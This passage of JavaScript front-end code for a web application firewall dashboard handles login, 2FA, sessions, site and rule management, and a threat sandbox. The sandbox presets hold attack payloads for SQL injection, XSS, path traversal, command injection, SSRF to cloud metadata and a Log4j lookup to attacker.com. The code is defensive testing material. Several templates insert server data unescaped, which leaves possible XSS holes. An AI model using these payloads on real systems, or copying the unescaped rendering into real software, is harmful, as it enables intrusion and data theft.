// ============================================================
// Bastion WAF Dashboard — Application Logic & Security
// ============================================================

let cachedRules = [];
let activeRuleCategory = 'ALL';
let trafficChartInstance = null;
let threatChartInstance = null;

// Authentication & Session State
let currentCsrfToken = null;
let currentUser = null;
let isSetupMode = false;
let pending2FAToken = null;
let isRecoveryCodeMode = false;
let telemetryTimer = null;
let isInitialTelemetryLoad = true;

// ---- Authenticated Fetch Wrapper with CSRF & 401 Interception ----
async function authFetch(url, options = {}) {
    options.credentials = options.credentials || 'same-origin';
    options.headers = options.headers || {};

    const method = (options.method || 'GET').toUpperCase();
    if (currentCsrfToken && ['POST', 'PUT', 'DELETE', 'PATCH'].includes(method)) {
        options.headers['X-CSRF-Token'] = currentCsrfToken;
    }

    try {
        const res = await fetch(url, options);
        if (res.status === 401) {
            // Unauthenticated: present login screen and pause background polls
            if (telemetryTimer) {
                clearInterval(telemetryTimer);
                telemetryTimer = null;
            }
            showLoginView(false);
        }
        return res;
    } catch (err) {
        console.error('Fetch error:', err);
        throw err;
    }
}

// ---- Theme ----
function getTheme() {
    return document.documentElement.getAttribute('data-theme') || 'dark';
}

function toggleTheme() {
    const next = getTheme() === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', next);
    localStorage.setItem('bastion-theme', next);
    applyChartTheme();
}

function restoreTheme() {
    const saved = localStorage.getItem('bastion-theme');
    if (saved) {
        document.documentElement.setAttribute('data-theme', saved);
    }
}

function getThemeColors() {
    const s = getComputedStyle(document.documentElement);
    return {
        grid: s.getPropertyValue('--chart-grid').trim(),
        tick: s.getPropertyValue('--chart-tick').trim(),
        legend: s.getPropertyValue('--chart-legend').trim(),
        accent: s.getPropertyValue('--accent').trim(),
        danger: s.getPropertyValue('--danger').trim(),
    };
}

function applyChartTheme() {
    const c = getThemeColors();
    if (trafficChartInstance) {
        const opts = trafficChartInstance.options;
        opts.scales.x.grid.color = c.grid;
        opts.scales.x.ticks.color = c.tick;
        opts.scales.y.grid.color = c.grid;
        opts.scales.y.ticks.color = c.tick;
        opts.plugins.legend.labels.color = c.legend;
        trafficChartInstance.data.datasets[0].borderColor = c.accent;
        trafficChartInstance.data.datasets[0].backgroundColor = c.accent + '14';
        trafficChartInstance.data.datasets[1].borderColor = c.danger;
        trafficChartInstance.data.datasets[1].backgroundColor = c.danger + '14';
        trafficChartInstance.update('none');
    }
    if (threatChartInstance) {
        threatChartInstance.options.plugins.legend.labels.color = c.legend;
        threatChartInstance.update('none');
    }
}

// ---- Navigation ----
function switchNav(tabId, el) {
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));

    const pane = document.getElementById('pane-' + tabId);
    if (pane) pane.classList.add('active');
    if (el) el.classList.add('active');

    if (tabId === 'sites') fetchSites();
    if (tabId === 'rules') fetchRules();
    if (tabId === 'logs') {
        fetchAuditLogs();
        fetchAdminAuditLogs();
    }
    if (tabId === 'access-control') fetchIPRules();
    if (tabId === 'system') fetchSystem();
}

// ---- Modals & Notifications ----
function openModal(id) { document.getElementById(id)?.classList.add('active'); }
function closeModal(id) { document.getElementById(id)?.classList.remove('active'); }

function showToast(msg) {
    const t = document.getElementById('toast');
    if (!t) return;
    document.getElementById('toast-msg').textContent = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2400);
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// ---- Authentication & Session Operations ----
async function checkAuthStatus() {
    try {
        const res = await fetch('/api/auth/status', { credentials: 'same-origin' });
        const data = await res.json();

        if (data.setup_required) {
            showLoginView(true);
            return;
        }

        if (data.authenticated && data.user) {
            onAuthSuccess(data.user, data.csrf_token);
        } else {
            showLoginView(false);
        }
    } catch (err) {
        console.error('Failed to check auth status:', err);
        showLoginView(false);
    }
}

function showLoginView(isSetup) {
    isSetupMode = isSetup;
    const loadingScreen = document.getElementById('app-loading');
    const authApp = document.getElementById('authenticated-app');
    const loginView = document.getElementById('login-view');
    const title = document.getElementById('auth-title');
    const subtitle = document.getElementById('auth-subtitle');
    const submitBtn = document.getElementById('auth-submit-btn');
    const forgotLink = document.getElementById('link-forgot-pwd');
    const alertBox = document.getElementById('auth-alert');

    if (loadingScreen) loadingScreen.style.display = 'none';
    if (authApp) authApp.style.display = 'none';
    if (loginView) loginView.style.display = 'flex';

    if (alertBox) {
        alertBox.style.display = 'none';
        alertBox.className = 'auth-alert';
    }

    resetAuthForm();

    if (isSetup) {
        if (title) title.textContent = 'Setup Administrator';
        if (subtitle) subtitle.textContent = 'Create the initial administrator account (minimum 12 characters).';
        if (submitBtn) submitBtn.textContent = 'Create Administrator Account';
        if (forgotLink) forgotLink.style.display = 'none';
    } else {
        if (title) title.textContent = 'Bastion Security Login';
        if (subtitle) subtitle.textContent = 'Enter your administrator credentials to access the SOC gateway.';
        if (submitBtn) submitBtn.textContent = 'Authenticate';
        if (forgotLink) forgotLink.style.display = 'block';
    }

    setTimeout(() => {
        document.getElementById('auth-email')?.focus();
    }, 100);
}

function showAuthModal(isSetup) {
    showLoginView(isSetup);
}

function resetAuthForm() {
    document.getElementById('auth-primary-form').style.display = 'flex';
    document.getElementById('auth-2fa-form').style.display = 'none';
    document.getElementById('auth-forgot-form').style.display = 'none';
    pending2FAToken = null;
    isRecoveryCodeMode = false;
}

function showAuthError(msg) {
    const alertBox = document.getElementById('auth-alert');
    if (alertBox) {
        alertBox.className = 'auth-alert';
        alertBox.textContent = msg;
        alertBox.style.display = 'block';
    }
}

async function handleAuthSubmit(e) {
    e.preventDefault();
    const email = document.getElementById('auth-email').value.trim();
    const password = document.getElementById('auth-password').value;
    const endpoint = isSetupMode ? '/api/auth/setup' : '/api/auth/login';

    const alertBox = document.getElementById('auth-alert');
    if (alertBox) alertBox.style.display = 'none';

    try {
        const res = await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password }),
            credentials: 'same-origin',
        });
        const data = await res.json();

        if (!res.ok) {
            showAuthError(data.detail || data.message || 'Authentication failed');
            return;
        }

        if (data.status === '2fa_required') {
            // Trigger 2FA view
            pending2FAToken = data.temp_token;
            document.getElementById('auth-primary-form').style.display = 'none';
            document.getElementById('auth-2fa-form').style.display = 'flex';
            setTimeout(() => document.getElementById('auth-2fa-code').focus(), 50);
            return;
        }

        if (data.user) {
            onAuthSuccess(data.user, data.csrf_token);
        }
    } catch (err) {
        showAuthError('Network error connecting to security server');
    }
}

function toggleRecoveryMode() {
    isRecoveryCodeMode = !isRecoveryCodeMode;
    const label = document.getElementById('label-2fa-code');
    const input = document.getElementById('auth-2fa-code');
    const link = document.getElementById('link-recovery');

    if (isRecoveryCodeMode) {
        label.textContent = '8-Character Recovery Code (e.g. ab12-cd34)';
        input.placeholder = 'ab12-cd34';
        input.maxLength = 12;
        link.textContent = 'Use 6-digit TOTP code';
    } else {
        label.textContent = '6-Digit Authenticator Code';
        input.placeholder = '123456';
        input.maxLength = 6;
        link.textContent = 'Use 8-character recovery code';
    }
}

async function handleTwoFactorSubmit(e) {
    e.preventDefault();
    const code = document.getElementById('auth-2fa-code').value.trim();
    if (!code || !pending2FAToken) return;

    try {
        const res = await fetch('/api/auth/2fa/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                temp_token: pending2FAToken,
                code: code,
                is_recovery: isRecoveryCodeMode,
            }),
            credentials: 'same-origin',
        });
        const data = await res.json();

        if (!res.ok) {
            showAuthError(data.detail || 'Verification code rejected');
            return;
        }

        if (data.user) {
            onAuthSuccess(data.user, data.csrf_token);
        }
    } catch (err) {
        showAuthError('Error during two-factor verification');
    }
}

function toggleForgotPassword(show) {
    document.getElementById('auth-primary-form').style.display = show ? 'none' : 'flex';
    document.getElementById('auth-forgot-form').style.display = show ? 'flex' : 'none';
    const alertBox = document.getElementById('auth-alert');
    if (alertBox) alertBox.style.display = 'none';
}

async function handleForgotSubmit(e) {
    e.preventDefault();
    const email = document.getElementById('auth-forgot-email').value.trim();

    try {
        const res = await fetch('/api/auth/reset/request', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email }),
        });
        const data = await res.json();
        showToast(data.message || 'Reset request dispatched');
        toggleForgotPassword(false);
    } catch (err) {
        showToast('Error requesting password reset');
    }
}

function onAuthSuccess(user, csrfToken) {
    currentUser = user;
    currentCsrfToken = csrfToken;

    const loadingScreen = document.getElementById('app-loading');
    const loginView = document.getElementById('login-view');
    const authApp = document.getElementById('authenticated-app');

    if (loadingScreen) loadingScreen.style.display = 'none';
    if (loginView) loginView.style.display = 'none';
    if (authApp) authApp.style.display = 'flex';

    // Clear password input
    const pwdInput = document.getElementById('auth-password');
    if (pwdInput) pwdInput.value = '';

    // Update Topbar
    const emailChip = document.getElementById('topbar-user-email');
    if (emailChip) {
        emailChip.textContent = user.email;
        emailChip.style.display = 'inline-block';
    }

    // Initialize telemetry & dashboard data
    if (!trafficChartInstance) {
        initCharts();
    }
    fetchRules();
    fetchIPRules();
    pollTelemetry();

    if (!telemetryTimer) {
        telemetryTimer = setInterval(pollTelemetry, 3000);
    }

    showToast(`Authenticated as ${user.email}`);
}

async function handleLogout() {
    try {
        await authFetch('/api/auth/logout', {
            method: 'POST',
        });
    } catch (err) {}

    currentUser = null;
    currentCsrfToken = null;
    if (telemetryTimer) {
        clearInterval(telemetryTimer);
        telemetryTimer = null;
    }

    const emailChip = document.getElementById('topbar-user-email');
    if (emailChip) emailChip.style.display = 'none';

    showToast('Session terminated');
    showLoginView(false);
    showAuthError('You have been signed out. Please authenticate to continue.');
    const alertBox = document.getElementById('auth-alert');
    if (alertBox) {
        alertBox.className = 'auth-alert success';
    }
}

// ---- Security Settings & 2FA Management Modal ----
function openSecurityModal() {
    if (!currentUser) return;
    openModal('securityModal');

    const badge = document.getElementById('totp-status-badge');
    const enabledBox = document.getElementById('totp-enabled-container');
    const disabledBox = document.getElementById('totp-disabled-container');
    const setupFlow = document.getElementById('totp-setup-flow');
    const recDisplay = document.getElementById('recovery-codes-display');

    if (setupFlow) setupFlow.style.display = 'none';
    if (recDisplay) recDisplay.style.display = 'none';

    if (currentUser.totp_enabled) {
        badge.textContent = 'Active';
        badge.className = 'badge badge-green';
        enabledBox.style.display = 'block';
        disabledBox.style.display = 'none';
    } else {
        badge.textContent = 'Disabled';
        badge.className = 'badge badge-amber';
        enabledBox.style.display = 'none';
        disabledBox.style.display = 'block';
    }

    fetchUserSessions();
}

async function initiate2FASetup() {
    try {
        const res = await authFetch('/api/auth/2fa/setup', { method: 'POST' });
        const data = await res.json();
        if (res.ok) {
            document.getElementById('totp-secret-key').value = data.secret;
            document.getElementById('totp-disabled-container').style.display = 'none';
            document.getElementById('totp-setup-flow').style.display = 'block';
        } else {
            showToast(data.detail || 'Failed to start 2FA setup');
        }
    } catch (e) {
        showToast('Network error setting up 2FA');
    }
}

function copyTotpSecret() {
    const input = document.getElementById('totp-secret-key');
    navigator.clipboard.writeText(input.value);
    showToast('Secret key copied to clipboard');
}

async function confirm2FAEnable() {
    const secret = document.getElementById('totp-secret-key').value;
    const code = document.getElementById('totp-confirm-code').value.trim();

    if (!code) {
        showToast('Please enter the 6-digit code');
        return;
    }

    try {
        const res = await authFetch('/api/auth/2fa/enable', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ secret, code }),
        });
        const data = await res.json();

        if (res.ok) {
            currentUser.totp_enabled = true;
            document.getElementById('totp-setup-flow').style.display = 'none';
            document.getElementById('totp-status-badge').textContent = 'Active';
            document.getElementById('totp-status-badge').className = 'badge badge-green';
            document.getElementById('totp-enabled-container').style.display = 'block';

            // Display recovery codes
            const grid = document.getElementById('recovery-codes-grid');
            grid.innerHTML = (data.recovery_codes || []).map(c => `<div>${c}</div>`).join('');
            document.getElementById('recovery-codes-display').style.display = 'block';
            showToast('2FA Enabled successfully');
        } else {
            showToast(data.detail || 'Invalid verification code');
        }
    } catch (e) {
        showToast('Error verifying 2FA code');
    }
}

function copyRecoveryCodes() {
    const codes = Array.from(document.querySelectorAll('#recovery-codes-grid div')).map(d => d.textContent).join('\n');
    navigator.clipboard.writeText(codes);
    showToast('Recovery codes copied');
}

function initiate2FADisable() {
    const form = document.getElementById('totp-disable-form');
    form.style.display = form.style.display === 'none' ? 'block' : 'none';
}

async function confirm2FADisable() {
    const password = document.getElementById('totp-disable-pwd').value;
    if (!password) {
        showToast('Password is required');
        return;
    }

    try {
        const res = await authFetch('/api/auth/2fa/disable', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password }),
        });
        const data = await res.json();

        if (res.ok) {
            currentUser.totp_enabled = false;
            openSecurityModal();
            showToast('2FA has been disabled');
        } else {
            showToast(data.detail || 'Failed to disable 2FA');
        }
    } catch (e) {
        showToast('Error disabling 2FA');
    }
}

async function handleChangePassword() {
    const current_password = document.getElementById('pwd-current').value;
    const new_password = document.getElementById('pwd-new').value;

    try {
        const res = await authFetch('/api/auth/password/change', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ current_password, new_password }),
        });
        const data = await res.json();

        if (res.ok) {
            if (data.csrf_token) currentCsrfToken = data.csrf_token;
            document.getElementById('pwd-current').value = '';
            document.getElementById('pwd-new').value = '';
            closeModal('securityModal');
            showToast('Password updated');
        } else {
            showToast(data.detail || 'Password update failed');
        }
    } catch (e) {
        showToast('Network error updating password');
    }
}

// ---- Active Sessions Management ----
async function fetchUserSessions() {
    const tbody = document.getElementById('active-sessions-tbody');
    if (!tbody) return;
    try {
        const res = await authFetch('/api/auth/sessions');
        if (!res.ok) {
            tbody.innerHTML = `<tr><td colspan="4" style="text-align: center; color: var(--text-muted); padding: 12px;">Unable to load sessions</td></tr>`;
            return;
        }
        const data = await res.json();
        const sessions = data.sessions || [];
        if (sessions.length === 0) {
            tbody.innerHTML = `<tr><td colspan="4" style="text-align: center; color: var(--text-muted); padding: 12px;">No active sessions found</td></tr>`;
            return;
        }

        tbody.innerHTML = sessions.map(s => {
            const currentBadge = s.is_current ? `<span class="badge badge-green" style="margin-left: 6px;">Current</span>` : '';
            const actionBtn = s.is_current 
                ? `<span style="color: var(--text-muted); font-size: 0.72rem;">This Session</span>`
                : `<button class="btn btn-outline" style="padding: 2px 7px; font-size: 0.72rem; color: var(--danger); border-color: rgba(239, 68, 68, 0.4);" onclick="revokeSession('${s.id}')">Revoke</button>`;

            return `
                <tr>
                    <td><code>${escapeHtml(s.ip_address || '—')}</code>${currentBadge}</td>
                    <td style="max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(s.user_agent || '')}">${escapeHtml(s.user_agent || 'Unknown')}</td>
                    <td style="font-family: var(--font-mono); font-size: 0.74rem;">${escapeHtml(s.last_active || '—')}</td>
                    <td style="text-align: right;">${actionBtn}</td>
                </tr>
            `;
        }).join('');
    } catch (err) {
        tbody.innerHTML = `<tr><td colspan="4" style="text-align: center; color: var(--danger); padding: 12px;">Error loading sessions</td></tr>`;
    }
}

async function revokeSession(sessionId) {
    try {
        const res = await authFetch(`/api/auth/sessions/${encodeURIComponent(sessionId)}`, {
            method: 'DELETE',
        });
        if (res.ok) {
            showToast('Session revoked');
            fetchUserSessions();
        } else {
            const data = await res.json();
            showToast(data.detail || 'Failed to revoke session');
        }
    } catch (err) {
        showToast('Error revoking session');
    }
}

async function revokeAllOtherSessions() {
    try {
        const res = await authFetch('/api/auth/sessions/revoke-others', {
            method: 'POST',
        });
        if (res.ok) {
            const data = await res.json();
            showToast(`Revoked ${data.revoked_count || 0} other session(s)`);
            fetchUserSessions();
        } else {
            const data = await res.json();
            showToast(data.detail || 'Failed to revoke other sessions');
        }
    } catch (err) {
        showToast('Error revoking sessions');
    }
}

// ---- Administrative Audit Trail ----
async function fetchAdminAuditLogs() {
    const tbody = document.getElementById('admin-audit-log-body');
    if (!tbody) return;
    try {
        const res = await authFetch('/api/audit?limit=50');
        if (!res.ok) {
            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted);">Unable to load audit trail</td></tr>`;
            return;
        }
        const data = await res.json();
        const logs = data.logs || [];
        if (logs.length === 0) {
            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 24px;">No administrative events recorded yet.</td></tr>`;
            return;
        }

        tbody.innerHTML = logs.map(l => {
            const statusBadge = l.status === 'success' 
                ? `<span class="badge badge-green">Success</span>`
                : (l.status === 'failure' ? `<span class="badge badge-red">Failure</span>` : `<span class="badge badge-cyan">${escapeHtml(l.status || '—')}</span>`);
            
            let detailsStr = '';
            if (l.details) {
                try {
                    const parsed = typeof l.details === 'object' ? l.details : JSON.parse(l.details);
                    detailsStr = Object.entries(parsed).map(([k, v]) => `${k}=${v}`).join(', ');
                } catch (e) {
                    detailsStr = String(l.details);
                }
            }

            return `
                <tr>
                    <td style="font-family: var(--font-mono); font-size: 0.74rem;">${escapeHtml(l.timestamp || '—')}</td>
                    <td><strong>${escapeHtml(l.action || '—')}</strong></td>
                    <td style="font-size: 0.76rem;">${escapeHtml(l.user_id ? `User #${l.user_id}` : 'system')}</td>
                    <td><code>${escapeHtml(l.ip_address || '—')}</code></td>
                    <td>${statusBadge}</td>
                    <td style="font-size: 0.76rem; color: var(--text-secondary); max-width: 250px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(detailsStr)}">${escapeHtml(detailsStr || '—')}</td>
                </tr>
            `;
        }).join('');
    } catch (err) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--danger);">Error loading audit trail</td></tr>`;
    }
}

// ---- Command Palette ----
window.addEventListener('keydown', (e) => {
    if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
        e.preventDefault();
        openCmdPalette();
    }
    if (e.key === 'Escape') {
        closeCmdPalette();
        closeModal('inspectModal');
        closeModal('addSiteModal');
        closeModal('securityModal');
        closeModal('confirmClearModal');
    }
});

function openCmdPalette() {
    openModal('cmdPaletteModal');
    setTimeout(() => document.getElementById('cmdPaletteInput')?.focus(), 50);
}
function closeCmdPalette() { closeModal('cmdPaletteModal'); }

function execCmd(action) {
    closeCmdPalette();
    if (action === 'clear-logs') clearAuditLogs();
    else {
        const navItem = document.querySelector(`.nav-item[onclick*="${action}"]`);
        switchNav(action, navItem);
    }
}

function filterCmdPalette(e) {
    const q = document.getElementById('cmdPaletteInput').value.toLowerCase();
    document.querySelectorAll('.cmd-item').forEach(item => {
        item.style.display = item.textContent.toLowerCase().includes(q) ? 'flex' : 'none';
    });
}

// ---- Protected Sites ----
async function fetchSites() {
    const tbody = document.getElementById('sites-tbody');
    if (!tbody) return;
    try {
        const res = await authFetch('/api/sites');
        const sites = await res.json();
        renderSites(sites);
    } catch (e) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: var(--danger); padding: 24px;">Failed to load protected sites.</td></tr>';
    }
}

function renderSites(sites) {
    const tbody = document.getElementById('sites-tbody');
    if (!tbody) return;

    if (!sites || sites.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="5" style="text-align: center; padding: 48px 20px;">
                    <div style="font-size: 1rem; font-weight: 600; color: var(--text-primary); margin-bottom: 6px;">
                        No Protected Sites Configured
                    </div>
                    <div style="font-size: 0.82rem; color: var(--text-muted); max-width: 440px; margin: 0 auto 16px auto; line-height: 1.5;">
                        Bastion WAF is operating as an independent inspection gateway on port 8080. Add a site to proxy clean traffic to an upstream application.
                    </div>
                    <button class="btn btn-primary" onclick="openModal('addSiteModal')">
                        Add Protected Site
                    </button>
                </td>
            </tr>
        `;
        return;
    }

    tbody.innerHTML = sites.map(s => {
        const isDefenseActive = s.defense_mode !== 0 && s.defense_mode !== false;
        return `
            <tr>
                <td>
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <span style="font-family: var(--font-mono); font-weight: 600; color: var(--text-primary);">${escapeHtml(s.domain)}</span>
                    </div>
                </td>
                <td>
                    <span style="font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-secondary);">
                        ${escapeHtml(s.upstream)}
                    </span>
                </td>
                <td>
                    <span class="badge ${isDefenseActive ? 'badge-green' : 'badge-amber'}">
                        ${isDefenseActive ? 'Protected' : 'Bypass'}
                    </span>
                </td>
                <td>
                    <label class="switch">
                        <input type="checkbox" ${isDefenseActive ? 'checked' : ''} onchange="toggleSiteDefense(${s.id}, this.checked)">
                        <span class="slider"></span>
                    </label>
                </td>
                <td style="text-align: right;">
                    <button class="btn btn-outline" style="padding: 4px 10px; font-size: 0.76rem; color: var(--danger); border-color: rgba(229, 72, 77, 0.3);" onclick="deleteSite(${s.id}, '${escapeHtml(s.domain)}')">
                        Delete
                    </button>
                </td>
            </tr>
        `;
    }).join('');
}

async function toggleSiteDefense(siteId, enabled) {
    try {
        const res = await authFetch('/api/sites', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ site_id: siteId, defense_mode: enabled }),
        });
        if (res.ok) {
            showToast(enabled ? 'Site defense active' : 'Site switched to bypass mode');
            fetchSites();
        } else {
            showToast('Failed to update defense mode');
        }
    } catch (e) {
        showToast('Network error updating defense mode');
    }
}

async function deleteSite(siteId, domain) {
    if (!confirm(`Are you sure you want to remove ${domain}?`)) return;
    try {
        const res = await authFetch(`/api/sites/${siteId}`, { method: 'DELETE' });
        if (res.ok) {
            showToast(`Removed ${domain}`);
            fetchSites();
        } else {
            showToast('Failed to delete site');
        }
    } catch (e) {
        showToast('Network error deleting site');
    }
}

async function submitNewSite() {
    const domainInput = document.getElementById('newSiteDomain');
    const upstreamInput = document.getElementById('newSiteUpstream');
    const domain = domainInput.value.trim();
    const upstream = upstreamInput.value.trim();

    if (!domain || !upstream) {
        showToast('Please fill out both domain and upstream');
        return;
    }

    try {
        const res = await authFetch('/api/sites', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ domain: domain, upstream: upstream }),
        });
        if (res.ok) {
            closeModal('addSiteModal');
            domainInput.value = '';
            upstreamInput.value = '';
            showToast(`Added site ${domain}`);
            fetchSites();
        } else {
            const data = await res.json().catch(() => ({}));
            showToast(data.message || 'Failed to add site');
        }
    } catch (e) {
        showToast('Network error adding site');
    }
}

// ---- Rules ----
function filterRuleCategory(cat, btn) {
    activeRuleCategory = cat;
    document.querySelectorAll('.rule-cat-btn').forEach(b => {
        b.classList.remove('btn-primary');
        b.classList.add('btn-outline');
    });
    if (btn) {
        btn.classList.remove('btn-outline');
        btn.classList.add('btn-primary');
    }
    renderRules();
}

function renderRules() {
    const container = document.getElementById('rules-container');
    if (!container) return;
    const searchVal = (document.getElementById('rule-search-input')?.value || '').toLowerCase();

    const filtered = cachedRules.filter(r => {
        const matchCat = (activeRuleCategory === 'ALL' || r.category === activeRuleCategory);
        const matchSearch = (!searchVal || r.rule_name.toLowerCase().includes(searchVal) || r.rule_id.includes(searchVal));
        return matchCat && matchSearch;
    });

    if (filtered.length === 0) {
        container.innerHTML = `<div style="text-align: center; color: var(--text-muted); padding: 36px;">No rules match your search.</div>`;
        return;
    }

    container.innerHTML = filtered.map(r => {
        const catBadge = r.category === 'OWASP Top 10' ? 'badge-red' : (r.category === 'API Security' ? 'badge-cyan' : 'badge-amber');
        return `
        <div style="display: flex; justify-content: space-between; align-items: center; background: var(--bg-input); border: 1px solid var(--border); padding: 12px 16px; border-radius: var(--radius-md); transition: border-color 0.12s;" onmouseenter="this.style.borderColor='var(--border-hover)'" onmouseleave="this.style.borderColor='var(--border)'">
            <div>
                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 2px;">
                    <strong style="font-size: 0.88rem; color: var(--text-primary);">${r.rule_name}</strong>
                    <span class="badge ${catBadge}">${r.category}</span>
                </div>
                <div style="font-size: 0.74rem; font-family: var(--font-mono); color: var(--text-muted);">${r.rule_id}</div>
            </div>
            <label class="switch">
                <input type="checkbox" ${r.enabled ? 'checked' : ''} onchange="toggleRule('${r.rule_id}', this.checked)">
                <span class="slider"></span>
            </label>
        </div>`;
    }).join('');
}

async function fetchRules() {
    try {
        const res = await authFetch('/api/rules');
        cachedRules = await res.json();
        document.getElementById('rule-count-badge').textContent = cachedRules.length;

        const countOWASP = cachedRules.filter(r => r.category === 'OWASP Top 10').length;
        const countAPI = cachedRules.filter(r => r.category === 'API Security').length;
        const countBot = cachedRules.filter(r => r.category === 'Bot Protection').length;

        const btns = document.querySelectorAll('.rule-cat-btn');
        if (btns.length >= 4) {
            btns[0].innerHTML = `All (${cachedRules.length})`;
            btns[1].innerHTML = `OWASP Top 10 (${countOWASP})`;
            btns[2].innerHTML = `API Security (${countAPI})`;
            btns[3].innerHTML = `Bot Protection (${countBot})`;
        }

        renderRules();
    } catch (err) { console.error(err); }
}

async function toggleRule(ruleId, isChecked) {
    try {
        const res = await authFetch('/api/rules', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ rule_id: ruleId, enabled: isChecked })
        });
        if (!res.ok) {
            showToast(`Failed to update rule ${ruleId}`);
            fetchRules();
            return;
        }
        const rule = cachedRules.find(r => r.rule_id === ruleId);
        if (rule) rule.enabled = isChecked;
        showToast(`Rule ${ruleId}: ${isChecked ? 'Enabled' : 'Disabled'}`);
    } catch (err) {
        console.error(err);
        showToast(`Network error updating rule ${ruleId}`);
        fetchRules();
    }
}

// ---- Threat Sandbox ----
function setSandboxPreset(type) {
    const method = document.getElementById('sb-method');
    const path = document.getElementById('sb-path');
    const query = document.getElementById('sb-query');
    const body = document.getElementById('sb-body');

    const presets = {
        sqli:  { m: 'GET', p: '/search',   q: "q=admin' OR '1'='1", b: '' },
        xss:   { m: 'GET', p: '/comment',  q: "msg=<script>alert('XSS')</script>", b: '' },
        lfi:   { m: 'GET', p: '/file',     q: 'name=../../../../etc/passwd', b: '' },
        rce:   { m: 'GET', p: '/exec',     q: 'cmd=cat /etc/passwd; id', b: '' },
        ssrf:  { m: 'GET', p: '/fetch',    q: 'url=http://169.254.169.254/latest/meta-data/', b: '' },
        ssti:  { m: 'GET', p: '/render',   q: 'name={{7*7}}', b: '' },
        log4j: { m: 'GET', p: '/api',      q: 'user=${jndi:ldap://attacker.com/exploit}', b: '' },
        clean: { m: 'GET', p: '/products', q: 'category=electronics&limit=10', b: '' },
    };
    const p = presets[type] || presets.clean;
    method.value = p.m; path.value = p.p; query.value = p.q; body.value = p.b;
    runSandboxSimulation();
}

async function runSandboxSimulation() {
    const resultBox = document.getElementById('sandbox-result-container');
    const method = document.getElementById('sb-method').value;
    const path = document.getElementById('sb-path').value;
    const query_string = document.getElementById('sb-query').value;
    const body = document.getElementById('sb-body').value;

    resultBox.innerHTML = `<div style="text-align: center; margin: auto;"><p style="margin-top: 8px; color: var(--accent); font-weight: 600;">Evaluating…</p></div>`;

    try {
        const res = await authFetch('/api/simulate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ method, path, query_string, body, headers: { 'user-agent': 'Bastion-Sandbox-Tester/1.0' } })
        });
        const data = await res.json();

        const verdictBadge = data.blocked
            ? '<span class="badge badge-red" style="font-size: 0.85rem;">Blocked</span>'
            : (data.action === 'CHALLENGE'
                ? '<span class="badge badge-amber" style="font-size: 0.85rem;">Challenge</span>'
                : '<span class="badge badge-green" style="font-size: 0.85rem;">Allowed</span>');

        const scoreColor = data.total_score >= 5 ? 'var(--danger)' : (data.total_score >= 2.5 ? 'var(--warning)' : 'var(--success)');

        resultBox.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 10px;">
                <div>
                    <span style="font-size: 0.72rem; color: var(--text-muted); display: block;">Decision</span>
                    ${verdictBadge}
                </div>
                <div style="text-align: right;">
                    <span style="font-size: 0.72rem; color: var(--text-muted); display: block;">Anomaly Score</span>
                    <strong style="font-size: 1.2rem; font-family: var(--font-mono); color: ${scoreColor};">${data.total_score || 0} / 10</strong>
                </div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; background: var(--bg-input); padding: 10px; border-radius: var(--radius-sm); font-size: 0.78rem;">
                <div><span style="color: var(--text-muted);">Rule score:</span> <strong style="color: var(--text-primary);">${data.rule_score || 0}</strong></div>
                <div><span style="color: var(--text-muted);">Semantic score:</span> <strong style="color: var(--accent);">${data.semantic_score || 0}</strong></div>
                <div style="grid-column: span 2;"><span style="color: var(--text-muted);">Archetype:</span> <span style="color: var(--warning);">${data.semantic_category || 'None'}</span></div>
            </div>

            <div>
                <span style="font-size: 0.74rem; color: var(--text-muted); display: block; margin-bottom: 3px;">Analysis</span>
                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 10px; font-size: 0.82rem; color: var(--accent);">
                    ${data.reason || 'No threat signatures detected.'}
                </div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
                <div>
                    <span style="font-size: 0.7rem; color: var(--text-muted); display: block; margin-bottom: 2px;">Raw input</span>
                    <pre style="background: var(--terminal-bg); border: 1px solid var(--border); padding: 8px; border-radius: 6px; font-size: 0.72rem; color: var(--text-secondary); max-height: 60px; overflow: auto; white-space: pre-wrap;">${data.raw_payload || 'N/A'}</pre>
                </div>
                <div>
                    <span style="font-size: 0.7rem; color: var(--text-muted); display: block; margin-bottom: 2px;">Normalized</span>
